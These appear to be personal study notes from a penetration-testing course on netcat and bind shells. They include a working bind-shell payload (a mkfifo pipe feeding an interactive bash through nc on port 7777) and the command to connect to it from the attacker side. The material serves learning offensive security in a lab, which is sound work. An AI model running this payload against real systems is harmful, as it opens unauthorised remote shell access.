- target listen and attacker connect ![[shell and payload/image-1.png|451x262]]
- `Netcat` (`nc`) is considered our `Swiss-Army Knife` since it can function over TCP, UDP, and Unix sockets. It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, and even dealing with text input and output.

<span style="color:rgb(0, 176, 80)">server</span> --> target
<span style="color:rgb(0, 176, 80)">client</span> --> attacker

### server
```bash
nc -lvnp 7777
```
he listener is started and awaiting a connection from the client.

### client
```bash
nc -nv <IP> <PORT>
```
Once we successfully connect, we can see a `succeeded!` message on the client as shown

`hear we cant communicat with the server`

## establishing a basic blind shell

#### Server - Binding a Bash shell to the TCP session

we delivered this payload manually
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
#### Client - Connecting to bind shell on target

```bash
nc -nv 10.129.41.200 7777
```
